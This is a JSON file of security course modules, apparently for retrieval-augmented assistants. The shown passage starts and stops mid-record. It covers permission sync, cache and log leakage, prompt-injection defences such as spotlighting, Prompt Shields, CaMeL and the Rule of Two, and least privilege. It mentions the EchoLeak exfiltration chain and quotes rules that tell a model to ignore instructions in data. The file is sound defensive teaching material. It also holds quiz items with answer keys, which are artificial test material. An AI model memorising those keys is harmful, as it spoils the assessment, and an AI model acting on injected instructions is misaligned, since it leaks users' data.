fields","Security reviews that ask how fast a leaver loses access to answers","Incident response after a folder move or group rename left stale ACLs"],"whenToUse":{"use":["Different tiers have different revocation targets","A copy of permissions exists in the index or a cache","You can sample and compare source and index ACLs"],"avoid":["Quoting a single revocation number for the whole system","Relying on one mechanism for parent-scope and item-scope changes","Assuming a managed indexer means no drift"],"flips":["Restricted data needs seconds: push merges from events plus a live check","Only general content is in scope: a scheduled indexer and a daily resync may be enough","Sources emit unreliable events: add delta-query reconciliation"]},"alternatives":{"title":"Compared with its neighbours","head":["Approach","Wins when","Loses when","Cost or risk"],"rows":[["Scheduled indexer only","Hours are acceptable","Seconds are required","Stale grants up to the interval"],["Event-driven push","Seconds for restricted tiers","Events are lost or delayed up to six hours","Pipeline and subscription upkeep"],["Event plus periodic full resync","You need both speed and self-healing","Resync is too heavy to run often","Compute cost of resync"],["Drift audit on a sample","Any copy of permissions exists","Sample misses rare scopes","Detection, not prevention"]]},"pitfalls":[{"symptom":"A folder permission change never reaches the index","cause":"Indexer runs pick up unique item ACLs but not parent-scope changes","fix":"Trigger /resync with options permissions on change events and schedule one"},{"symptom":"Events stop and nobody notices","cause":"A Graph subscription expired after under 29 days","fix":"Renew early, alert on missing events and reconcile with delta queries"},{"symptom":"Revoked users still see cached answers","cause":"Answer or semantic caches are not scoped by ACL or outlive the target","fix":"Key caches by ACL scope and set TTL below the revocation target"},{"symptom":"Deleted documents still appear in citations","cause":"Deletes were not propagated to the index or caches","fix":"Propagate tombstones by source id and test deletes with a canary"}],"scenarios":[{"id":"w07-t15-s1","title":"General content, hours acceptable","situation":"An assistant covers 40 SharePoint sites of general internal content. Permissions rarely change, and leaving staff lose access to the source immediately. Hours of lag are acceptable to the business.","constraints":["General internal content","Revocation within hours","40 sites"],"unknowns":["How often do parent-scope permissions change?","Who watches the sync?"],"question":"What sync design fits?","options":[{"name":"Indexer every few hours, a daily resync of permissions and a sampled drift audit","verdict":"best","why":"It matches an hours target at low cost and heals parent-scope changes through the resync [[r16]].","tradeoff":"Stale grants for hours and a job to monitor."},{"name":"Event-driven push pipeline with Graph subscriptions","verdict":"good","why":"Faster than needed.","tradeoff":"Builds and runs a pipeline the target does not justify."},{"name":"Indexer only, and assume the managed service keeps ACLs right","verdict":"poor","why":"Parent-scope changes are not picked up by runs, so drift grows unseen.","tradeoff":"Acceptable only for content where wrong access has no impact."}],"flips":[{"if":"A subset of sites turns restricted","then":"Give those sites event-driven updates and a live check."},{"if":"Compliance needs evidence","then":"Keep drift audit reports."}],"takeaway":"Match the machinery to the revocation target."},{"id":"w07-t15-s2","title":"Restricted tier, seconds","situation":"A restricted tier in a custom push index must reflect a revoked grant within about ten seconds. The source emits change events through a webhook that occasionally drops messages.","constraints":["Revocation in seconds","Push index","Unreliable events"],"unknowns":["How often are events lost?","Is a live check allowed on restricted hits?"],"question":"How do you meet the target?","options":[{"name":"Nightly resync","verdict":"poor","why":"A day of lag misses ten seconds by a wide margin.","tradeoff":"Right for general content with a daily target."},{"name":"Event-driven merge of the ACL field, a reconciliation job and a live check on restricted hits","verdict":"best","why":"Events give speed, reconciliation catches lost messages and the live check covers the gap [[r19]].","tradeoff":"Three mechanisms to run and test."},{"name":"Poll the source change feed every minute and merge","verdict":"good","why":"Simpler than webhooks and self-healing.","tradeoff":"Up to a minute of lag, so ten seconds is missed."}],"flips":[{"if":"The target relaxes to five minutes","then":"A five-minute poll or indexer works."},{"if":"The source offers a reliable change feed with ordering","then":"Drop the reconciliation job."}],"takeaway":"Seconds need events, healing and a live check."},{"id":"w07-t15-s3","title":"Drift found after a folder move","situation":"A daily sample finds that 0.3% of documents under a moved folder carry old ACLs in the index. Some of them are now more restricted at the source.","constraints":["Drift detected","Some docs now more restricted","Index is the serving path"],"unknowns":["How many documents are in the affected scope?","Can mismatched documents be hidden quickly?"],"question":"What do you do first?","options":[{"name":"Wait for the next scheduled run to fix it","verdict":"poor","why":"Exposure continues, and parent-scope changes are not picked up by runs anyway.","tradeoff":"Fine only for mismatches that grant less access."},{"name":"Contain by hiding mismatched documents, run a targeted resync of the scope, then add a parent-scope event trigger","verdict":"best","why":"It stops exposure first, fixes the scope and removes the root cause.","tradeoff":"Some documents are briefly unavailable."},{"name":"Run a full re-index of the corpus immediately","verdict":"good","why":"Fixes everything.","tradeoff":"Slow and expensive, and it does not contain exposure while it runs."}],"flips":[{"if":"Mismatches only grant less access than the source","then":"Fix on the normal schedule."},{"if":"Restricted data was exposed","then":"Open an incident and review logs."}],"takeaway":"Contain, repair the scope, then fix the cause."},{"id":"w07-t15-s4","title":"Deleted file still cited","situation":"A user deleted a sensitive file at the source. Two hours later the assistant still quotes it. The index sync runs every four hours and a semantic cache holds answers for a day.","constraints":["Delete at the source","Four-hour sync","One-day answer cache"],"unknowns":["Do deletes propagate through the indexer?","How is the cache keyed?"],"question":"How do you close the gap?","options":[{"name":"Propagate deletes as tombstones by source id to the index and invalidate caches that cite it","verdict":"best","why":"It removes the chunks and every cached answer built from them.","tradeoff":"Needs source ids on chunks and cache entries."},{"name":"Shorten the cache TTL only","verdict":"good","why":"Reduces the cached exposure.","tradeoff":"The index still serves the chunks until the next sync."},{"name":"Wait for the next full rebuild","verdict":"poor","why":"It leaves the document live for hours or days.","tradeoff":"Acceptable only for non-sensitive content."}],"flips":[{"if":"The source supports soft deletes with events","then":"Use those events to trigger tombstones."},{"if":"Caches are keyed by ACL scope and short-lived","then":"Cache invalidation may be unnecessary."}],"takeaway":"Revocation covers deletes, index copies and caches."}],"quiz":[{"id":"w07-t15-q1","type":"numeric","tag":"numeric","q":"Using P(stale) = 1 - exp(-lambda x lag): 5% of grants are revoked per day (lambda = 0.05 / 24 per hour) and sync lag is 24 hours. What percentage of returned grants is stale?","answer":4.9,"tolerancePct":5,"unit":"%","hint":"lambda x lag = 0.05","explain":"lambda times lag is 0.05, and 1 minus exp(-0.05) is about 0.049, or 4.9%. With 10 hits per query about 39% of queries contain a revoked document. It is a lab model, not a measurement.","ref":"r19"},{"id":"w07-t15-q2","type":"single","tag":"flip","q":"A SharePoint library's permissions change at the folder level. The indexer runs every 5 minutes. What brings the index up to date?","options":["The next scheduled run alone","A call to /resync with options permissions, or /resetdocs for specific keys","Waiting for the access token to expire","Nothing: SharePoint pushes folder changes to the index"],"answer":1,"explain":"Runs pick up unique item ACL changes, but parent-scope changes need an explicit resync of permissions or a reset of specific documents.","ref":"r16"},{"id":"w07-t15-q3","type":"multi","tag":"tradeoff","q":"Which statements set a realistic revocation expectation? Choose all that apply.","options":["A pull indexer cannot update faster than its schedule interval of at least 5 minutes","Graph driveItem notifications can take up to six hours","Push ingestion can patch the ACL field immediately with merge","A managed indexer guarantees zero drift"],"answers":[0,1,2],"explain":"The schedule minimum is 5 minutes, driveItem notification latency has a six-hour maximum and push merge can update ACLs at once. No managed service guarantees zero drift.","ref":"r27"}],"flashcards":[{"front":"What is the revocation floor of a pull indexer?","back":"Its next run. The schedule interval is 5 to 1,440 minutes. Push ingestion can update ACLs immediately with merge but you own the change feed."},{"front":"How would you detect ACL drift?","back":"Sample documents daily, compare source and index ACLs, alert on any mismatch, hide mismatches until fixed, and chart the age of the oldest unsynced change."},{"front":"What does revocation include besides permission edits?","back":"Deletes and every cache: index chunks, answer caches, semantic caches and membership caches. Test with a canary document."}],"related":["w07-t10","w07-t12","w07-t16","w07-t19","w07-l6","w03-t06"],"refs":["r16","r19","r26","r27","r35"]},{"id":"w07-t16","order":16,"group":"Operations and defences","title":"Cache and log leakage","minutes":8,"difficulty":"core","summary":"Caches and logs hold copies of permissioned content outside the ACL. A semantic cache can answer one user from another user's retrieved documents, and a content log can expose what the index protected.","useIf":"You cache answers, embeddings or prompts, or you log prompts, chunks or responses.","avoidIf":"You have no cache and log identifiers only. Then this topic is already satisfied.","explain":[{"t":"p","md":"The index enforces ACLs. Everything downstream that stores content does not. Four stores matter: **provider prompt caches**, your **exact-match response cache**, a **semantic cache** and **logs and stored conversation state**."},{"t":"table","caption":"Where permissioned content can leak (checked 2026-10-13)","head":["Store","Leak vector","Scoping control"],"rows":[["Provider prompt cache","Reuse of an identical prefix across users","OpenAI: not shared across organizations, with an optional prompt_cache_key [[tr10]]. Azure OpenAI: not shared across subscriptions [[r30]]. Anthropic: per organization, and per workspace on several surfaces [[tr11]]"],["Semantic cache","A similar question returns an answer built from another user's documents","Azure API Management llm-semantic-cache-lookup with vary-by on user or group id, and a strict score-threshold [[r28]]"],["Exact-match response cache","Same question, different rights","Key on the normalized question plus the caller's ACL scope"],["Logs and stored state","Content copied into a store with no ACLs","Log ids and decisions. Responses API, threads and stored completions keep history at rest in your Foundry resource, so they need retention and access rules [[r38]]"]]},{"t":"p","md":"**Semantic caches** need the most care. The APIM policy uses a `score-threshold` from 0.0 to 1.0 where lower means a stricter match. The docs suggest starting near 0.05 and warn that values above 0.2 may cause mismatches, and that semantic caching can return incorrect, outdated or unsafe answers. `vary-by` partitions the cache, for example by user or group id, to control cross-user access [[r28]]."},{"t":"p","md":"**Provider prompt caches** are scoped by the provider, and same-tenant users share an entry only when the whole prefix matches, which already includes the same retrieved text (design reasoning). Use `prompt_cache_key` for accounting or routing, not as a security control [[tr10]]. A timing side-channel audit (ICML 2025) found global cache sharing across users in seven API providers at study time and showed timing differences can leak other users' prompts. Provider docs now state organization or workspace scoping, so read the paper as the reason to prefer scoped caches and not as current behaviour [[r29]]."},{"t":"callout","kind":"gotcha","title":"A cache TTL is part of the revocation SLA","md":"A cached answer outlives a revoked grant by up to its TTL. Set the TTL below the revocation target, and skip the cache when any source document carries a restricted label (design reasoning)."}],"whereToUse":["Cost reduction work that adds a semantic or response cache in front of generation","Logging design for assistants over permissioned content","Reviews of stateful features such as stored conversations or threads","Multi-user gateways where one cache serves different principals"],"whenToUse":{"use":["Scope every cache entry by ACL scope or user","Keep TTLs below the revocation target","Log ids and decisions by default"],"avoid":["A global semantic cache over permissioned answers","Loosening the similarity threshold to raise hit rate","Writing full prompts and chunks to a broadly readable log workspace"],"flips":["ACL scope is nearly unique per user: a semantic cache has a near-zero hit rate, so drop it","Content is public: a shared cache is fine","An incident needs content: capture it for a bounded window under its own access control"]},"alternatives":{"title":"Cache and log options compared","head":["Option","Wins when","Loses when","Cost or risk"],"rows":[["No cache","Revocation target is seconds, scope varies per user","Cost and latency matter and scope is shared","Higher generation cost"],["Exact-match cache keyed by user or ACL scope","Repeated identical questions in a group","Rights change faster than the TTL","Low hit rate for fine scopes"],["Semantic cache with vary-by","Many similar questions inside one scope","Scope is nearly unique, content is volatile","Mismatch and stale answers"],["Provider prompt cache only","Long shared prefixes","You expected it to save retrieval or answer text","Little leakage risk, little saving across users"],["Content logs under strict access","Incident analysis","Retention rules are loose","Protected text outside the ACL"]]},"pitfalls":[{"symptom":"A user gets an answer citing documents they cannot open","cause":"A semantic cache served another user's answer","fix":"Partition with vary-by on the ACL scope and tighten the threshold"},{"symptom":"A revoked user still gets the old answer","cause":"The answer cache TTL is longer than the revocation target","fix":"Shorten the TTL and key by ACL scope"},{"symptom":"Support staff can read confidential prompts","cause":"The log workspace has broad read and holds full content","fix":"Log ids and decisions, and put any content capture under its own access control and expiry"},{"symptom":"Deleted conversations remain retrievable","cause":"Stored state in the Responses API or threads was not covered by retention rules","fix":"Include stateful stores in deletion and access reviews [[r38]]"}],"scenarios":[{"id":"w07-t16-s1","title":"Semantic cache for 5,000 employees","situation":"An internal assistant sees many repeated questions. Cost is high. Groups define access, and employees fall into a few hundred distinct group sets. Revocation target is one hour.","constraints":["Few hundred distinct ACL scopes","Revocation within an hour","Cost pressure"],"unknowns":["Do restricted labels exist in the corpus?","How similar are repeated questions in a scope?"],"question":"How do you cache?","options":[{"name":"A global semantic cache with a loose threshold for hit rate","verdict":"poor","why":"It will return answers built from other users' documents and above 0.2 it may mismatch [[r28]].","tradeoff":"Right only for public content."},{"name":"Exact-match cache keyed by user","verdict":"good","why":"Safe and simple.","tradeoff":"Low hit rate because each user is a separate key."},{"name":"Semantic cache partitioned by ACL scope with vary-by, a strict threshold, a TTL under an hour and a skip for restricted labels","verdict":"best","why":"Users in the same scope share answers, and the TTL fits the revocation target.","tradeoff":"More cache entries, tuning, and a bypass rule to maintain."}],"flips":[{"if":"Scope is nearly unique per user","then":"The semantic cache rarely hits, so drop it."},{"if":"Revocation tightens to minutes","then":"Shorten the TTL or remove the cache for restricted tiers."}],"takeaway":"Partition semantic caches by ACL scope."},{"id":"w07-t16-s2","title":"Debugging needs versus content in logs","situation":"Engineers want full prompts and retrieved chunks in logs to debug bad answers. The log workspace is readable by a large operations group. Documents are confidential.","constraints":["Confidential content","Broad log readership","Debugging need"],"unknowns":["How long is content needed?","Can access to the log store be narrowed?"],"question":"What do you log?","options":[{"name":"Document ids, principal id, filter hash and decision by default, with content capture only for a bounded window under its own access control","verdict":"best","why":"Ids reproduce the retrieval, and content is available only when an incident needs it.","tradeoff":"Debugging text quality takes an extra step."},{"name":"Full prompts and chunks to the shared workspace","verdict":"poor","why":"It copies ACL-protected text into a store with broad read access.","tradeoff":"Acceptable for public content in a private workspace."},{"name":"Redacted snippets only","verdict":"good","why":"Useful quality signal.","tradeoff":"Redaction misses things and the store still needs access control."}],"flips":[{"if":"An incident requires content","then":"Open a time-limited capture with its own ACL and delete after."},{"if":"The corpus is public","then":"Full logging is acceptable."}],"takeaway":"Logs copy content out of the ACL, so default to ids."},{"id":"w07-t16-s3","title":"prompt_cache_key as a tenant wall","situation":"A team plans to set prompt_cache_key per tenant and says that stops tenants sharing cached prefixes, so they can put any tenant's documents in a shared prefix.","constraints":["Shared multi-tenant prefix","OpenAI-style API","Cost saving goal"],"unknowns":["What does the provider say about cache scope?","What is actually in the shared prefix?"],"question":"How do you respond?","options":[{"name":"Treat the key as routing and accounting, rely on provider scoping, and keep tenant documents out of any shared prefix","verdict":"best","why":"Caches are not shared across organizations, and the key is not documented as a security control [[tr10]].","tradeoff":"Less prefix reuse across tenants."},{"name":"Use the key as the isolation control and put tenant data in the shared prefix","verdict":"poor","why":"It turns a hit-rate setting into a security claim it does not make.","tradeoff":"Fine to use as accounting alongside enforced separation."},{"name":"Disable prompt caching everywhere","verdict":"good","why":"Removes the question.","tradeoff":"Higher cost and latency for stable prefixes."}],"flips":[{"if":"Prefixes hold only public instructions","then":"Share them freely and keep tenant content in the suffix."},{"if":"Zero Data Retention applies","then":"The default becomes in-memory retention for models that support both modes, so check the retention setting per model [[tr10]]."}],"takeaway":"Cache keys tune hit rate. They do not enforce access."}],"quiz":[{"id":"w07-t16-q1","type":"single","tag":"security","q":"Users report seeing answers that cite documents they cannot open. A semantic cache sits in front of generation. What is the most likely fix?","options":["Raise the temperature","Partition the cache with vary-by on the ACL scope and tighten the similarity threshold","Increase the cache TTL","Switch to a larger embedding model"],"answer":1,"explain":"The cache returned another user's answer. Partitioning by ACL scope and tightening the threshold prevents cross-user hits. A longer TTL makes it worse, and temperature or model size are unrelated.","ref":"r28"},{"id":"w07-t16-q2","type":"multi","tag":"concept","q":"Which statements are supported by provider documentation? Choose all that apply.","options":["OpenAI prompt caches are not shared across organizations","Azure OpenAI prompt caches are not shared between Azure subscriptions","prompt_cache_key is a security control for tenant isolation","Anthropic isolates caches per workspace on the Claude API"],"answers":[0,1,3],"explain":"OpenAI, Azure OpenAI and Anthropic documents state organization, subscription and workspace scoping. prompt_cache_key routes and separates accounting and is not described as a security control.","ref":"tr10"}],"flashcards":[{"front":"What do APIM's score-threshold and vary-by do for semantic caches?","back":"score-threshold sets match strictness (lower is stricter, start near 0.05, above 0.2 may mismatch). vary-by partitions the cache, for example by user or group id."},{"front":"Is prompt_cache_key a security control?","back":"No. It routes requests and separates cache accounting. Isolation comes from provider scoping by organization, subscription or workspace and from your own design."},{"front":"What should logs hold by default for permissioned content?","back":"Document ids, principal id, filter hash and the decision. Capture content only for a bounded window under its own access control."}],"related":["w07-t15","w07-t19","w07-l4","w02-t15","w02-t12"],"refs":["r28","r29","r30","r38","tr10","tr11"]},{"id":"w07-t17","order":17,"group":"Operations and defences","title":"Spotlighting and prompt-injection defences","minutes":9,"difficulty":"advanced","summary":"Prompt-injection defences come in two kinds: probabilistic ones (spotlighting, Prompt Shields, hardened prompts) that lower attack success, and architectural ones that remove what an attack could use. You need both, and you need to know each one's limit.","useIf":"Untrusted text (documents, web pages, tool results) reaches the model and you must pick and layer defences.","avoidIf":"You expect one guard to solve injection. None does.","explain":[{"t":"p","md":"**Spotlighting** marks untrusted text so the model can tell it from instructions. Microsoft's paper names three modes: *delimiting* (randomized delimiters around the text), *datamarking* (a special token woven through it) and *encoding* (for example base64 or ROT13), and the system prompt is changed to say not to follow instructions in the marked content [[tr9]]. In the authors' experiments attack success on GPT-family models fell from above 50% to below 2% with minimal task impact. It remains a probabilistic technique [[r8]]."},{"t":"p","md":"**Prompt Shields** in Azure AI Content Safety scans for user prompt attacks and document attacks. The standalone API analyzes a `userPrompt` and up to five `documents` and reports `attackDetected`. In Foundry, document attacks are scanned at user input and tool response. Its Spotlighting option is **preview** as of 2026-10-13: off by default, base64-encodes documents, applies only to models used through Chat Completions, and can raise token counts or push a long document past the input limit [[tr8]]. Check supported languages and input limits before relying on it."},{"t":"stats","items":[{"label":"Spotlighting, attack success","value":"50%+ to under 2%","note":"GPT-family models, the authors' tests [[r8]]"},{"label":"CaMeL, tasks solved with provable security","value":"77%","note":"Versus 84% undefended on AgentDojo: the cost of design-level safety [[r9]]"},{"label":"Rule of Two","value":"2 of 3","note":"Untrusted input, sensitive access, external action. Meta, 2025-10-31 [[r10]]"}]},{"t":"table","caption":"Layers and their limits","head":["Layer","What it does","Limit"],"rows":[["Hardened prompt","Tells the model to ignore instructions in data","Overridable, a hint at most"],["Spotlighting","Marks untrusted spans","Probabilistic, token cost for encoding"],["Prompt Shields","Detects document and prompt attacks","Probabilistic, language and size limits"],["Capability design (Rule of Two, CaMeL style)","Removes the leg an attack needs","Costs features or utility"],["Deterministic egress and approval","Blocks outbound paths, gates actions","Reviewer cost, product trade-off"]]},{"t":"callout","kind":"warn","title":"EchoLeak is the reminder","md":"A production classifier was one link in a chain that still exfiltrated data [[r6]]. If a session holds untrusted input, private data and an outbound channel (the lethal trifecta [[tr18]]), remove a leg or require approval before adding more detectors."}],"whereToUse":["Pipelines that place retrieved documents, web pages or tool results into the prompt","Agents with tools, where injected text could trigger an action","Document upload flows where users supply the content","Defence-in-depth reviews that must explain each layer's failure mode"],"whenToUse":{"use":["Untrusted text reaches the prompt","You can add detection in parallel without breaking latency","You pair detection with a capability or egress limit"],"avoid":["Relying on prompt wording alone","Turning on encoding-style spotlighting for very long documents without checking the token cost","Treating a detection rate as a guarantee"],"flips":["The agent gains a send or write tool: add approval and remove a trifecta leg","Tokens are tight: prefer delimiting or datamarking in your template over encoding","Content is only from vetted staff: spend less on detection and more on permissions"]},"alternatives":{"title":"Defences compared","head":["Defence","Wins when","Loses when","Cost or risk"],"rows":[["Spotlighting","Untrusted text sits in clear spans","Adaptive attackers, long documents with encoding","Token cost, model mentions encoding"],["Prompt Shields","You want managed detection of known patterns","New phrasing, unsupported languages","Latency, false positives"],["Rule of Two or CaMeL-style design","Impact is high and actions change state","You need maximum autonomy and utility","Fewer features, 77% versus 84% in the CaMeL tests"],["Human approval","Actions are rare and irreversible","High volume","Fatigue and cost"],["Egress limits","You know the allowed destinations","Allowed hosts forward requests","Maintenance"]]},"pitfalls":[{"symptom":"Long documents fail or cost more after enabling Spotlighting","cause":"Base64 encoding raises the token count","fix":"Check the input limit, chunk before spotlighting or use delimiting and datamarking in your own template"},{"symptom":"Answers mention that content is base64 encoded","cause":"The model sees the encoding","fix":"Instruct the model about the encoding or hide the detail in post-processing"},{"symptom":"A detector reports no attacks yet a red team succeeds","cause":"The detector is probabilistic and the exit path is open","fix":"Add deterministic egress limits and test with new phrasings and languages"}],"scenarios":[{"id":"w07-t17-s1","title":"High-volume Q&A, no tools","situation":"A RAG assistant handles high volume over a mixed corpus and has no tools and no outbound channel. The token budget is tight and p95 latency is capped. Some documents come from external partners.","constraints":["High volume","No tools or egress","Tight tokens and latency"],"unknowns":["Which sources are external?","What is the cost of a poisoned answer?"],"question":"Which defences do you add?","options":[{"name":"Azure Spotlighting with base64 on every document","verdict":"good","why":"Strong marking of untrusted text.","tradeoff":"Preview, raises tokens and can break long documents."},{"name":"An LLM judge that reads every chunk before generation","verdict":"poor","why":"It multiplies cost and latency at high volume.","tradeoff":"Reasonable for low-volume, high-risk workflows."},{"name":"Prompt Shields on documents in parallel, plus delimiting or datamarking in the prompt template","verdict":"best","why":"Adds detection and marking with limited token cost, and without an outbound channel the impact is bounded [[tr8]].","tradeoff":"Probabilistic layers and language limits, so test them."}],"flips":[{"if":"A tool or outbound channel is added","then":"Add approval and egress limits first."},{"if":"External partners are removed from the corpus","then":"Reduce detection to sampled checks."}],"takeaway":"Without tools, layered detection is proportionate."},{"id":"w07-t17-s2","title":"Agent with a write tool","situation":"An agent reads customer documents, queries account data and can update records. A wrong or injected update is costly. The budget allows extra latency and cost.","constraints":["Untrusted documents","Private data","Write tool","Generous budget"],"unknowns":["Is the update reversible?","How often do updates occur?"],"question":"How do you secure it?","options":[{"name":"Prompt Shields and spotlighting only","verdict":"poor","why":"All three trifecta legs remain, and both defences are probabilistic.","tradeoff":"Suitable as extra layers after a leg is removed."},{"name":"Split roles: a no-tool reader summarises untrusted text into structured fields, and the acting agent sees only those fields, with approval on updates","verdict":"best","why":"It removes the path from untrusted text to the write tool, following the Rule of Two [[r10]].","tradeoff":"More components, a review step and some lost autonomy."},{"name":"Full control and data flow separation in the CaMeL style","verdict":"good","why":"Gives provable properties for the flows it covers [[r9]].","tradeoff":"In the paper it solved 77% of tasks against 84% undefended, and it is heavy to build."}],"flips":[{"if":"Updates are low impact and simple to reverse","then":"Sampled audit instead of approval."},{"if":"Documents come only from vetted staff","then":"Detection layers can be lighter."}],"takeaway":"When a write tool exists, remove a leg before adding detectors."},{"id":"w07-t17-s3","title":"Multilingual corpus","situation":"A support assistant ingests documents in eight languages, several of which are not widely covered by detectors. The team plans to rely on a managed shield.","constraints":["Eight languages","Managed detector","No outbound channel yet planned"],"unknowns":["Which languages does the detector cover?","Does the roadmap add tools?"],"question":"What do you do?","options":[{"name":"Rely on the managed shield for all languages","verdict":"poor","why":"Coverage is limited to the tested languages and a gap silently removes the layer.","tradeoff":"Fine when all content is in covered languages."},{"name":"Test the detector per language, keep deterministic limits (no egress, least privilege) and red-team in each language","verdict":"best","why":"It measures real coverage and does not depend on detection alone.","tradeoff":"Test and maintenance effort per language."},{"name":"Translate everything to English before scanning","verdict":"good","why":"Brings text into covered territory.","tradeoff":"Adds latency and cost, and translation can alter or remove an attack."}],"flips":[{"if":"All sources are in covered languages","then":"Standard layered setup applies."},{"if":"Tools are added","then":"Apply the Rule of Two review."}],"takeaway":"Measure coverage before trusting a detector."}],"quiz":[{"id":"w07-t17-q1","type":"match","tag":"concept","q":"Match each spotlighting mode to what it does.","pairs":[{"l":"Delimiting","r":"Adds randomized delimiters around untrusted text"},{"l":"Datamarking","r":"Weaves a special token through the untrusted text"},{"l":"Encoding","r":"Transforms the text, for example with base64 or ROT13"}],"explain":"These are the three modes in Microsoft's description. In each, the system prompt tells the model not to follow instructions in the marked content.","ref":"tr9"},{"id":"w07-t17-q2","type":"single","tag":"diagnose","q":"An agent reads untrusted web pages, holds private data and can send email. It has Prompt Shields and spotlighting. What is the main residual risk?","options":["Spotlighting uses too many tokens","All three trifecta legs are present, and both layers are probabilistic","Prompt Shields only works on images","Email cannot carry data"],"answer":1,"explain":"Untrusted input, private data and an outbound channel together enable exfiltration, and detection can be bypassed. Remove a leg or require approval. Token use is a cost issue, not the main risk.","ref":"r10"}],"flashcards":[{"front":"What are the three spotlighting modes?","back":"Delimiting (randomized delimiters), datamarking (a token woven through the text) and encoding (base64 or ROT13). It is probabilistic."},{"front":"What is the Azure Spotlighting status as of 2026-10-13?","back":"Preview inside Prompt Shields. Off by default, base64 encodes documents, Chat Completions only, and can raise token counts."},{"front":"What does the CaMeL result teach?","back":"Design-level safety has a cost: 77% of AgentDojo tasks with provable security versus 84% undefended."}],"related":["w07-t02","w07-t05","w07-t18","w06-t05","w06-t01"],"refs":["r6","r8","r9","r10","tr8","tr9","tr18"]},{"id":"w07-t18","order":18,"group":"Operations and defences","title":"Least privilege and output controls","minutes":8,"difficulty":"core","summary":"Give each identity and tool the minimum it needs, treat model output as untrusted, and put a human in front of actions that are costly or irreversible. Limits on what an attack can do matter more than perfect detection.","useIf":"Your assistant calls tools, writes to systems or runs with a service identity.","avoidIf":"You are choosing the document ACL mechanism. Least privilege sits around it and does not replace it.","explain":[{"t":"p","md":"OWASP LLM06 Excessive Agency lists four mitigations: **minimise the extensions** the model can call, **minimise each extension's functions**, **avoid open-ended extensions** such as run-a-shell-command or fetch-a-URL, and **minimise the permissions** the extension holds, enforced through the identity it uses. Its example: an agent that recommends products needs read access to a products table, with no access to other tables and no insert, update or delete [[tr5]]."},{"t":"table","caption":"One identity per job","head":["Identity","Holds","Does not hold"],"rows":[["Query-time retrieval","The caller's delegated token. In Azure AI Search the calling app needs Search Index Data Reader [[r12]]","Write access to the index"],["Ingestion pipeline","Read on sources and write on the index. SharePoint indexing needs application permissions [[r16]]","Any role used at query time"],["Tool executor","The minimum rights for one task, per user where possible","A shared admin credential"],["Admin debugging","A dedicated role for elevated read, which sees all documents [[r12]]","Standing use by the application"]]},{"t":"p","md":"**Output controls** apply OWASP LLM05: encode, validate and apply a content security policy (see the exfiltration topic) [[tr4]]. Add citation hygiene: show titles and links only for documents the caller may open, since a title can leak. Scan for secrets and personal data where leaks are text patterns."},{"t":"p","md":"**Human review** belongs on actions that are irreversible, externally visible or sensitive. Microsoft Agent Framework has a built-in hook: in Python a `@tool` with `approval_mode=\"always_require\"`, with `user_input_requests` on the run result, and in .NET `ApprovalRequiredAIFunction`, which produces `ToolApprovalRequestContent` [[tr17]]. When untrusted input, private data and an external action all appear, require approval or remove a leg [[r10]]."},{"t":"callout","kind":"gotcha","title":"Review is a control only if it works","md":"Show the reviewer the evidence (sources, the filter used, the exact action), not only a yes or no button. A queue that reviewers approve in bulk adds delay and no safety."}],"whereToUse":["Designing service identities for retrieval, ingestion and tools","Reviewing an agent whose tools include shell, fetch or database access","Choosing which actions get an approval gate and which get a sampled audit","Tightening an assistant after a security review finds a broad credential"],"whenToUse":{"use":["The assistant can change state or contact outside systems","A shared credential has more rights than any one user","Actions differ widely in risk"],"avoid":["Approving every action at high volume","Open-ended tools such as run any query or fetch any URL","Using one admin key for query, ingest and debugging"],"flips":["Actions are reversible and high volume: sampled audit with an easy undo","Actions are irreversible and rare: approval with evidence","The tool can be replaced by a narrow, purpose-built function: do that first"]},"alternatives":{"title":"Controls compared","head":["Control","Wins when","Loses when","Cost or risk"],"rows":[["Narrow tools and scoped identities","You can name the task precisely","The task is open-ended exploration","Design effort, less flexibility"],["Approval gates","Few, irreversible actions","High volume","Latency, reviewer fatigue"],["Sampled audit after the fact","Reversible, high-volume actions","Damage cannot be undone","Late detection"],["Output filtering","Leaks are patterns","Data is paraphrased or encoded","False positives, streaming delay"],["Prompt rules only","Tone and format guidance","Anything security related","Overridable"]]},"pitfalls":[{"symptom":"An injected instruction deletes records","cause":"The tool's database role has write rights it never needed","fix":"Use a read-only role limited to the needed tables and enforce it in the database"},{"symptom":"Citations reveal restricted titles","cause":"Titles and links were returned without checking the caller's access","fix":"Return citations only for documents the caller can open"},{"symptom":"Reviewers approve everything","cause":"A high-volume queue with no evidence on screen","fix":"Tier by risk, show sources and the exact action, and sample the rest"},{"symptom":"The application can read every document with its own key","cause":"One admin credential serves query, ingestion and debugging","fix":"Split identities and keep elevated read for a dedicated role"}],"scenarios":[{"id":"w07-t18-s1","title":"One admin key in the application","situation":"A small team ships an assistant that uses the search service's admin key for queries, ingestion and debugging because it was quick. The assistant serves 300 employees.","constraints":["Small team","One key for everything","Per-user permissions exist in the index"],"unknowns":["Where is the key stored?","Does the app pass the user's token to the search service?"],"question":"What do you change first?","options":[{"name":"Leave it and add a prompt rule about confidential documents","verdict":"poor","why":"A prompt is not enforcement and the key reaches everything.","tradeoff":"A tone rule helps only alongside real controls."},{"name":"Split identities: query-time with the user's token and Search Index Data Reader, a separate ingestion identity, and a dedicated elevated-read role for debugging","verdict":"best","why":"Each identity holds only what its job needs, and ACL filters apply at query time [[r12]].","tradeoff":"Token plumbing and role management."},{"name":"Rotate the admin key monthly","verdict":"good","why":"Reduces exposure time.","tradeoff":"The key still holds every right, so a leak is still total."}],"flips":[{"if":"Content is public and uniform","then":"A single read-only identity is enough."},{"if":"Native ACLs are not used","then":"Build the filter server side and still split ingestion from query."}],"takeaway":"One identity per job."},{"id":"w07-t18-s2","title":"A run-any-SQL tool","situation":"An analytics assistant has a tool that runs SQL the model writes, using a credential that can read and write several schemas. Documents in the knowledge base are user-authored.","constraints":["Open-ended tool","Broad credential","User-authored documents"],"unknowns":["Which tables does the task need?","Can the credential be scoped?"],"question":"How do you reduce the risk?","options":[{"name":"Add a system prompt rule: never run destructive statements","verdict":"poor","why":"Injected text can override the rule, and the credential still allows damage.","tradeoff":"A hint only."},{"name":"Replace it with narrow, parameterised functions and a read-only database role limited to the needed tables","verdict":"best","why":"It applies minimise-functions and minimise-permissions from LLM06 and enforces them in the database [[tr5]].","tradeoff":"Less flexibility for new questions, so add functions as needs appear."},{"name":"Keep run-any-SQL but require approval for each statement","verdict":"good","why":"A human sees each query.","tradeoff":"Reviewer fatigue and the credential stays broad."}],"flips":[{"if":"Only analysts use it in a sandbox copy","then":"Open-ended SQL on a read-only replica may be acceptable."},{"if":"Queries are always one of ten shapes","then":"Expose those as named functions."}],"takeaway":"Replace 